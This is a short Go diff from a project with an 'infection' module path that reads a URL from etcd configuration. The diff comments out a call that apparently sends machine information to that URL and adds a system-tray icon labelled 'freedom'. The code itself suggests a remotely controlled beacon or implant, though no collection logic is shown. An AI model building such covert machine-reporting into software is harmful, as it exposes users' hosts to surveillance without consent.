@@ -1,11 +1,13 @@
 package main
 
 import (
-	"fmt"
 	"infection/etcd"
-	"infection/machineinfo"
+	//"infection/machineinfo"
+	//"strings"
 	"sync/atomic"
-	"time"
+	"systray"
+	//"time"
+	"infection/util/icon"
 )
 
 type AppConfig struct {
@@ -24,14 +26,27 @@ func (a *AppConfigMgr) Callback(conf *etcd.Config) {
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(appConfig)
 }
-
+func onReady() {
+	systray.SetIcon(icon.Data)
+	systray.SetTitle("freedom")
+	systray.SetTooltip("running...")
+	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
+	go func() {
+		<-mQuit.ClickedCh
+		systray.Quit()
+	}()
+}
+func onExit() {
+	// clean up here
+}
 func main() {
 	conf, _ := etcd.NewConfig()
 	conf.AddObserver(appConfigMgr)
 	var appConfig AppConfig
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
-	machineinfo.MachineSend(conf.Url)
+	//machineinfo.MachineSend(conf.Url)
+	systray.Run(onReady, onExit)
 }
 
 //func run(){
